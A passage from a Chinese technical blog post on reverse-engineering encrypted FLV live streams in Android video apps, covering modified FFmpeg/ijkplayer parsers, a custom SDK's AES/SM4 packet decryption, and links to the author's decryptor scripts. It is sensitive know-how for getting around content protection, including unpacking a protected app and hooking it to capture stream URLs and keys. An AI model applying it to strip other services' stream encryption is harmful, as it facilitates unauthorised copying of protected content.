href='/img/2022/ReFLV/2.1.04.png' data-fancybox='default' data-caption='all in one'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.1.04.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.1.04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="all in one"></a><span class='image-caption'>all in one</span></div></div><p>红色横线是在源码中的插入位置，在 <code>ff_read_packet()</code> 之后交给其先解密再继续操作；</p><p><code>FFmpeg</code> 有很多非常复杂的结构体，还原起来十分困难，到处都在取偏移，如果偏移比较小可以对照源码中的结构体数一下，如果很大，那只能试试可以对照着源码有没有其他位置来确定这个属性，比如：蓝色框中可以参考黑色框对应的伪代码来还原，详细内容见汇编的注释；</p><p><code>v71</code> 是一个比较简单的结构体——<code>AVPacket</code>，可以适当修改后直接写入定义，该定义位于 <code>libavcodec/avcodec.h</code> 中，在 <code>Local Types</code> 中插入然后修改 <code>v71</code> 类型即可。</p><p>为了搞清楚左侧伪代码到底做了什么事情，首先分割为三部分，如图中深红线分割；</p><p>第一部分是 <code>v5 == 0x15002</code>，此时为 <code>AAC</code>，解密方式：跳过 <code>7B</code>，剩余的以 <code>16B</code> 为单位解密，最后 <code>&lt;= 16B</code> 的部分保持不变；</p><p>第二、三部分都是 <code>H264</code>，第二部分是解密 <code>FLV</code> 的 <code>NALU</code> 码流的，第三部分解密标准中的 <code>NALU</code> 码流，这里只看第二部分即可；</p><p>先判断长度，然后计算 <code>v8</code>，<code>v8</code> 是 <code>NALU header + payload</code>，<code>v9</code> 是 <code>v8</code> 再加上 <code>4（单元长度）</code> 也就是 <code>NALU</code> 的长度，如果 <code>v9</code> 和 <code>size</code> 相同表示是 <code>FLV</code> 封装否则是标准封装的 <code>NALU</code>，之后是从 <code>NALU</code> 跳过 <code>5B（单元长度 + NALU header）</code>的位置开始解密，以 <code>16B</code> 为单位，最后 <code>&lt;= 16B</code> 部分保持不变。</p><p>还有个问题 sm4 解密用的 key 在哪，这部分在 Java 层，略过。</p><p>通过继承可以方便的实现解密，代码：<code>ReN</code><a href="https://github.com/yzctzl/ReFLV/blob/master/ReFLV/ReN.py">^14</a></p><h3 id="Parser"><a href="#Parser" class="headerlink" title="Parser"></a>Parser</h3><p>首先有两个名字需要区分一下：demuxer 和 parser，前者是解复用器，后者被称为解析器。解复用器的作用是从容器中把音视频流和字幕流分离出来，然后分别处理，解析器在 FFmpeg 中更多的指对 AVC&#x2F;HEVC&#x2F;AAC 等编码参数集的解析。</p><p>但解复用器中也有对容器的解析，这部分也可以被称为解析器。如果解析器解析的是容器，那对应的是 demuxer 的一部分；如果解析的是 NALU header 或者 VPS&#x2F;SPS&#x2F;PPS 等参数集，那对应的是 parser，也就是本小节的内容。</p><p>上面我们提到，读取完成之后会根据情况进行解析，解析的函数是：<code>parse_packet</code>，在调用的该函数的时候已经调用完 <code>read_packet</code> 拿到了完整的一帧数据，所以在此处既可以方便的解密整个帧，也可以在解析时针对某种 NALU 或者 NALU 的一部分做解密。</p><p>我们来看一下 <code>parse_packet</code> 的调用结构图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.2.01.png' data-fancybox='default' data-caption='parser'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.2.01.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.2.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="parser"></a><span class='image-caption'>parser</span></div></div><p>前半部分是调用，动手脚的可能相对小一点，后面的以 hevc 为例，对应的解析器源码在 <code>hevc_parse.c</code> 中，这其中真正用于解析的是 <code>hevc_parse</code> 这个函数，调用了解析各种参数集的函数。</p><p>这些参数集对解码来说是必须的，如果其做了加密，必然导致无法解码。这里加密的有点是代价很小，因为这些参数集的大小相对加密 I&#x2F;P&#x2F;B 帧小到可以忽略。</p><p>出了参数集加密，在这里已经读完了一个完整的帧，这里加密某一类 NALU 或者 NALU 的某一部分都非常方便。这样的加密往往都放在 <code>parse_nal_units</code> 中。</p><h4 id="还原"><a href="#还原" class="headerlink" title="还原"></a>还原</h4><p>在搞实例 F 之前，先来考虑一个问题：如何还原 FFmpeg 中的结构体？实例 N 中可以看到结构体对分析至关重要，而 FFmpeg 中结构体非常复杂且分散，那如何才能更方便的还原结构体呢？</p><p>先来看一下 IDA 中创建结构体的方式：</p><ol><li>直接在 LocalTypes&#x2F;structs&#x2F;enums 中创建结构体和枚举</li><li>导入头文件，要求导入的头文件无依赖</li><li>导入 Type Libraries，使用其中的结构体</li></ol><p>若是使用有限几个结构体成员或结构体很简单，比如 N 中用到的 AVPacket，那直接使用第一种方法新建一个即可；若是遇到修改了 FFmpeg 结构体而产生错位，可以用占位符替代，然后一点点分析确定成员。</p><p>如果遇到的修改很多，可以考虑第二和第三种方式，但第二种方式并不适用 FFmpeg，因为其中的头文件一堆 #include，几乎无法导入成功。第三种要制作 Type Library，这需要用到 Tilib 工具，该工具在 IDA SDK 中，FFmpeg 的头文件相对容易处理一些，.&#x2F;configure 生成 config.h 之后问题就不大了，但在处理标准库依赖的时候难倒我了，Tilib 几乎无法处理 NDK 的 C 标准库，各种报错而且错误棘手难以找到原因，更不用谈修复了。</p><p>这时候一种思路是：能否自己编译一个带符号的版本，然后由此制作 til 呢？根据《IDA Pro Book》 8.6.2 节，有三种方法：</p><ol><li>复制有符号的 til 然后导入到另一个</li><li>导出 typeinfo 为一段 IDC 脚本，在另一个中导入</li><li>导出 typeinfo 为 .h 头文件，用 Tilib 制作 til</li></ol><p>这里采用第三种，使用 Tilib 工具的好处是可以修改头文件也可以指定编译器信息，更加灵活。IDA 导出的头文件很可能无法直接给 Tilib 使用，需要自己修改一下，常见的问题：去掉重复 typedef，声明一些结构体等等，通过报错可准确定位。</p><p>为了后续方便，我制作了 ijkplayer v0.8.8 armv7a 的符号库：ijk.til，因为 F 中已经确定魔改自 armv7a 所以可以直接导入，如果不是基于 ijkplayer 或者 armv7a 可能会导致 long 尺寸、对齐方式、结构体不同，需要 Tilib 指定编译器信息或者重新编译制作类型库。</p><h4 id="实例-F"><a href="#实例-F" class="headerlink" title="实例 F"></a>实例 F</h4><p>这是个很喜欢动手动脚而且都改的乱七八糟的 App，播放器是基于 <code>ijkplayer.so</code> 魔改的 <code>F.so</code>，推流服务也是各种魔改，所以算是个孤例吧；该魔改 <code>F.so</code> 也实现了 FLV 的 <code>HEVC</code> 扩展，而且解密和 H264 类似，下面以 HEVC 解密为例。</p><p>App 加了个梆梆免费版，脱修之后可以 hook，直接从 tcpdump&#x2F;wireshark 中抓个源，下载个样本视频，播放有声音无画面，用 010 Editor 打开，如下图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.2.02.png' data-fancybox='default' data-caption='010 parse'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.2.02.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.2.02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="010 parse"></a><span class='image-caption'>010 parse</span></div></div><p>图中紫色部分包括 <code>Tag header，Video Tag header</code> 以及第一个 <code>NALU</code>，这些都是正常的，可以正常使用模板解析，但第二个 <code>NALU</code> 就出错了，问题应该出在这里。</p><p>IDA 中拖入该 so，搜索字符串 ijk 确定版本号，下载 Bilibili 维护的对应版本 FFmpeg，在 Source Insight 中打开。</p><p>根据导出表，有个 <code>decrypt()</code> 函数很可疑，hook 一下确定了该位置是用于 AVC 解密的，函数如下：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.2.03.png' data-fancybox='default' data-caption='fun decrypt'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.2.03.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.2.03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="fun decrypt"></a><span class='image-caption'>fun decrypt</span></div></div><p>调用了 <code>OpenSSL</code> 来解密，猜测 <code>HEVC</code> 的解密也用到了这几个 <code>OpenSSL</code> 的函数，查找引用，找到了 <code>sub_F3FAC</code>，这个函数只有一个调用者：<code>sub_F4024</code>，根据其中的字符串在 Source Insight 中查找，基本可以判定该函数为：<code>hevc_parse()</code>，显然是对解析器动了手脚，插入位置在：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.2.08.png' data-fancybox='default' data-caption='hevc_parse'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.2.08.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.2.08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="hevc_parse"></a><span class='image-caption'>hevc_parse</span></div></div><p>导入 <code>ijk.til</code>，下面还原 <code>hevc_parse</code> 的参数类型，代码的可读性就非常高了，如下图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.2.04.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.2.04.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.2.04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>先寻找 <code>sign_hevc</code> 标志，在 <code>0,40,41,42,47</code> 位置上寻找，标志前的不做变动，然后在模式串上做一些乱七八糟的操作得到两个固定串，分别作为 <code>key,iv</code> 用来做第一次解密：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.2.05.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.2.05.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.2.05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>密文长度为 <code>0x13B</code>，解密后直接保存到密文的位置，解密出来的内容作为以后解密的参数，其前 <code>2B</code> 用作长度，表示未加密长度，中间 <code>1B</code> 无用，后 <code>16B</code> 用作第二次解密的密钥：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.2.06.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.2.06.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.2.06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>最后解密：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.2.07.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.2.07.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.2.07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>由上总结该加密的 NALU 语法为：<code>[reserved_data][sign_hevc(8B)][enc_header(0x13B)][unenc_data][enc_data]</code>。</p><p>这样 <code>NALU</code> 的解密就可以写出来了，AVC 和 HEVC 类似，不赘述了，感兴趣直接看代码吧 <code>ReF</code><a href="https://github.com/yzctzl/ReFLV/blob/master/ReFLV/ReF.py">^15</a>。</p><h3 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h3><p>TODO: 需要样本</p><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>为了描述方便，这里的滤镜含义包括 FFmpeg 提供的和自定义的所有直接对 <code>AVFrame(可用来存放 YUV)</code> 的操作。</p><p>与其他类型的加密不同，如果应用了某种滤镜，那首先要解码拿到 <code>AVFrame</code>，然后还原，再送去编码封装才能还原画面，也就是说需要重新编码，只能拿到 <code>rip</code>。</p><p>另外添加滤镜的画面也可能与原画面之间存在某种联系，比如：亮度变化明显的区域在添加滤镜之后可能依旧会出现类似变化。因为滤镜作用的是 <code>AVFrame</code>，应用滤镜之后的 <code>AVFrame</code> 会发送给 <code>encoder</code> 编码，而编码是有损的！因此不能对 <code>AVFrame</code> 加密，这就导致只能对其做一些简单的映射然后播放时还原，这会使其编码后的视频保留有原视频的一些特征。</p><p>我看过一个平台，但很可惜目前其已停止运行，<code>so</code> 也找不到了，它可能采用了这样的方式：大致为：把 <code>YUV</code> 分成等宽的 10 个条带，对这其打乱顺序，这部分对解码后 <code>YUV</code> 进行操作；编码之后的画面自然也是乱序的，在播放器的实现中，解码拿到 <code>YUV</code> 之后将它们的顺序恢复。</p><h4 id="实测"><a href="#实测" class="headerlink" title="实测"></a>实测</h4><p>虽然没有样本，不过思路有了，根据思路我自己实现了一个，并对其进行了还原，在调用 <code>avcodec_send_frame()</code> 之前做打乱顺序的操作，核心部分如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 仅适用于 YUV420p，如果不是，可以加个 format 滤镜转一下</span></span><br><span class="line"><span class="type">uint8_t</span> *temp[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line"><span class="type">uint8_t</span> *tt = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">2</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">    temp[j] = av_malloc(_size);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> m = j ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> _size = result_frame-&gt;linesize[j] * result_frame-&gt;height / m;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> _slic = _size / <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> _map[<span class="number">10</span>] = &#123;<span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// int r_map[10] = &#123;9, 6, 1, 4, 7, 0, 3, 5, 8, 2&#125;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; _size; i++)</span><br><span class="line">        temp[j][i] = result_frame-&gt;data[j][_map[i / _slic] * _slic + (i % _slic)];</span><br><span class="line">    </span><br><span class="line">    tt = result_frame-&gt;data[j]; result_frame-&gt;data[j] = temp[j]; av_free(tt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.3.01.png' data-fancybox='default' data-caption='filter result'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.3.01.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.3.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="filter result"></a><span class='image-caption'>filter result</span></div></div><p>还原结果：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/2.3.02.png' data-fancybox='default' data-caption='filter result'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/2.3.02.png" class="lazyload" data-srcset="/img/2022/ReFLV/2.3.02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="filter result"></a><span class='image-caption'>filter result</span></div></div><p>效果依旧带有很强的可辨识性，所以也可以实现一个更复杂的版本，比如：先对 YUV 分别做异或然后再分割为 16*8 个条带，这样就与灰屏差不多了。</p><p>使用滤镜的缺点也不小，首先不可能得到源码需要重编码，必然导致客户端画质下降；其次因为分割的原因导致画面失去连贯性，这样编码器在边界处需要更复杂的计算、更多的比特来储存信息，于是编码器效率降低了；最后这种方式更容易辨识，进而还原。我个人认为这并非一种理想的方式。</p><h3 id="Codec"><a href="#Codec" class="headerlink" title="Codec"></a>Codec</h3><p>FFmpeg 自带的解码器效率一般，<code>H264/H265</code> 最常用的解码器是 <code>x264/x265</code>，尽管它们并未完整地实现标准，不过其对编解码过程做了很多优化，效率很好，所以应用最广。</p><p>解码器目前我还从未见过魔改的，可能是因为这部分足够复杂，我对此了解有限，下面介绍一种确定视频是否存在 <code>Codec</code> 魔改的方法：</p><ol><li>首先排除掉读取和解析过程中做了魔改，若已魔改先对其修复</li><li>然后使用码流分析工具，比如：<code>Elecard StreamEye</code> 查看画面是否正常</li><li>如果正常或部分正常，那大概率没有魔改，更可能是解码之前的步骤没处理干净</li><li>如果所有宏块或一类尺寸的宏块全都报错显示不正常，那应该是 <code>Codec</code> 做了魔改</li></ol><p>对第一步，有个判断解码之前是否存在魔改的思路：hook 函数 <code>avcodec_send_packet()</code> 其中的 <code>AVPacket</code> 结构体，输出其 data 属性的数据，然后对比下载的 FLV，如果能找到相同的数据估计没魔改，反之是做了魔改。</p><h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>本节中介绍 FFmpeg 部分只是帮助理解实例所动的手脚，所介绍的可能只占 FFmpeg 的九牛一毛，如果想了解更多细节，可以阅读 雷神<a href="https://blog.csdn.net/leixiaohua1020">^11</a> 的博客与 《FFmpeg 从入门到精通》 一书。</p><h2 id="自定义实现"><a href="#自定义实现" class="headerlink" title="自定义实现"></a>自定义实现</h2><p>上一节分析了 FFmpeg 中的各个环节中容易动手脚的地方，可 FFmpeg 毕竟只占半壁江山，也会遇到不用 FFmpeg 的大佬去手撸 IO 交互、流媒体协议或者解析器的情况。比如下面这个例子。</p><h3 id="实例-D"><a href="#实例-D" class="headerlink" title="实例 D"></a>实例 D</h3><p>这是某公司开发的音视频直播 SDK，宣称全自研、跨平台、延迟极低。解码部分可用硬件解码器，其他部分全自研。我这个是安卓平台的 App，核心库为 <code>D.so</code>，其中包含两套接口，以较新的 <code>V2</code> 接口为例。</p><p>hook 一下 <code>V2</code> 接口中的 <code>setUrl</code> 抓个源，然后下个样本，用 010 Editor 打开，解析一下容器：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/3.1.04.png' data-fancybox='default' data-caption='D Sample'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/3.1.04.png" class="lazyload" data-srcset="/img/2022/ReFLV/3.1.04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="D Sample"></a><span class='image-caption'>D Sample</span></div></div><p>整个文件所有视频帧全是 I 帧，这显然有问题，如何还原呢？接着看：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/3.1.05.png' data-fancybox='default' data-caption='D Sample'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/3.1.05.png" class="lazyload" data-srcset="/img/2022/ReFLV/3.1.05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="D Sample"></a><span class='image-caption'>D Sample</span></div></div><p>首先注意到整个容器除了 <code>v_frame_type</code> 恒等于 <code>1</code> 外一切正常；重要的：一个 <code>Tag</code> 中包含多个 <code>NALU</code>。</p><p><code>Tag 116</code> 中包含 <code>6 个 NALU</code>，前两个是 <code>SPS(nal_unit_type == 7)、PPS(nal_unit_type == 8)</code>，后面四个是 <code>IDR(nal_unit_type == 5)</code> 帧的四个切片；<code>Tag 120</code> 中包含<code>四个非 IDR 切片(nal_unit_type == 1)</code>，可以是 <code>I/P/B</code> 的切片，都不是关键帧；基于此，我们可以把 <code>IDR</code> 帧所在 <code>Tag</code> 保持不变，其他修复为 <code>P/B frame(v_frame_type = 2)</code>。</p><p>下面来刚 D.so，这里用的 <code>Ghidra</code>，感觉效果更好一点，流程比较复杂，要理清框架不容易，为了方便理解，我制作了一张调用结构图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/3.1.01.png' data-fancybox='default' data-caption='D.so'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/3.1.01.png" class="lazyload" data-srcset="/img/2022/ReFLV/3.1.01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="D.so"></a><span class='image-caption'>D.so</span></div></div><p>前面无关紧要就不扣细节了，有些符号可以猜测函数功能，感兴趣可以去看反汇编。下面先看 <code>FLV Parser</code> 部分：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/3.1.02.png' data-fancybox='default' data-caption='Parser'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/3.1.02.png" class="lazyload" data-srcset="/img/2022/ReFLV/3.1.02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Parser"></a><span class='image-caption'>Parser</span></div></div><p>是不是有种很熟悉的感觉，就是一层一层的脱掉 <code>header</code> 然后 parse，其间一边设置结构体一边根据值判断接下来的操作；大致过程为先处理 <code>FLV header</code>，然后循环 <code>ParserTag</code>：解析 <code>Tag header</code>、<code>Video Tag header/Audio Tag header</code>，最后音频码流直接就交给下一层，视频码流添加 <code>StartCode</code> 也交给下一层。这个过程和 <code>ReFLV</code> 类似，相当于 <code>FFmpeg</code> 中的 <code>flv_read_packet</code>。</p><p>我们把精力集中到解密音视频的具体操作，看调用流程：无论音视频都是首先调用 <code>ParserHeader</code>，然后创建 <code>Decryptor</code> 并调用 <code>DecryptPacket</code> 来解密，该函数首先获取一个 <code>SkipPlainTextSize</code> 的长度，表示未加密长度，然后分别根据音频和视频调用对应解密函数，解密完成 <code>Attach</code> 到结果中。</p><p>如果是音频，直接调用 <code>AES CBC Decrypt</code>；如果是视频，首先要 <code>NalUnEscape</code>，它有个逆函数是 <code>NalEscape</code> 负责把 <code>payload(RBSP)</code> 中的 <code>0x000001</code> 变为 <code>0x00000301</code>，来避免解码过程中遇到 <code>StartCode</code> 而产生错误，那么该函数则负责从 <code>0x00000301</code> 中去掉 <code>0x03</code>，还原真实负载之后再解密。</p><p>首先是 <code>ParserHeader</code>，这个 <code>Header</code> 在哪里呢？看下面的例子：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/3.1.07.png' data-fancybox='default' data-caption='enc header'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/3.1.07.png" class="lazyload" data-srcset="/img/2022/ReFLV/3.1.07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="enc header"></a><span class='image-caption'>enc header</span></div></div><p>这里红色的 <code>Enc header(13B)</code> 就是需要解析加密头，接下来直接看反汇编解析就行了，这里就不看了比较简单，直接根据上图的例子解析结果如下，名称是我根据功能随便起的：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/3.1.08.png' data-fancybox='default' data-caption='parse header'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/3.1.08.png" class="lazyload" data-srcset="/img/2022/ReFLV/3.1.08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="parse header"></a><span class='image-caption'>parse header</span></div></div><p>接下来无论音频还是视频都去初始化 <code>Decryptor</code>，主要是初始化结构体 <code>EncryptBase</code>：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/3.1.06.png' data-fancybox='default' data-caption='Parser'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/3.1.06.png" class="lazyload" data-srcset="/img/2022/ReFLV/3.1.06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Parser"></a><span class='image-caption'>Parser</span></div></div><p>根据 EncryptBase 的构造器和 get 和 set 函数可以还原红框中的结构体，<code>PTR_FUN</code> 指向函数指针列表，后面解密会用到其中的 Decrypt 函数；这里有四种解密：<code>AES/AESFix/SM4/SM4Fix</code>，根据 <code>p3/p5</code> 来判断用哪种，下面以 <code>AES CBC</code> 为例。</p><p>然后都调用 <code>DecryptPacket</code> 用来解密数据，如下图：</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/ReFLV/3.1.09.png' data-fancybox='default' data-caption='DecryptPacket'><img fancybox itemprop="contentUrl" src="/img/2022/ReFLV/3.1.09.png" class="lazyload" data-srcset="/img/2022/ReFLV/3.1.09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="DecryptPacket"></a><span class='image-caption'>DecryptPacket</span></div></div><p>这个函数标注的比较清晰了，右下的绿框中是调用 <code>OpenSSLAESCBCEncrypt::Decrypt</code> 之前的最后一个函数，其具体操作为：</p><ol><li>做了一些检查是否满足解密条件</li><li>视频的话需要首先处理 startcode，将 0x000003 &#x3D;&gt; 0x0000</li><li>根据上上图中 PTR_FUN 的赋值，调用 AES CBC 解密函数</li><li>解密完成后根据 p6 判断解密数据中是否带 crc32 校验，位于最后 4B</li><li>如果带那计算 crc32 判断和最后 4B 是否相同</li></ol><p>至此，流程就搞清楚了，key 和 iv 是固定的很简单，就不赘述了。</p><p>实现细节见：<code>ReD</code><a href="https://github.com/yzctzl/ReFLV/blob/master/ReFLV/ReD.py">^16</a></p><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>不像 FFmpeg 可以对照源码，确定函数作用的码流范围是件头疼的事情，可以考虑以下方式：</p><ol><li>hook 解密函数获取密文和明文，与此同时下载视频，然后对照获取密文偏移，从而倒推 header</li><li>找具有标志性的数值比如：TagType 和 CodecID 等，然后细心追踪查看内部调用的偏移</li><li>本例用到了一串固定字符用来标示 header，可据此确定偏移</li></ol><h3 id="实例-L"><a href="#实例-L" class="headerlink" title="实例 L"></a>实例 L</h3><p>这是某云厂商的短视频配套 SDK，包括协议和音视频全自研，跨平台，支持 FLV 加密。但有趣的是其并未为其云上客户提供该接口，而是自家产品用上了。</p><p>首先确定做加密的位置，目标 app 中有 160 个 so，和音视频相关的有十几个，和 ffmpeg 相关的几个库 trace 了 AVFrame 相关的函数，无果，剩下的几个拖到 IDA 里看看有没有 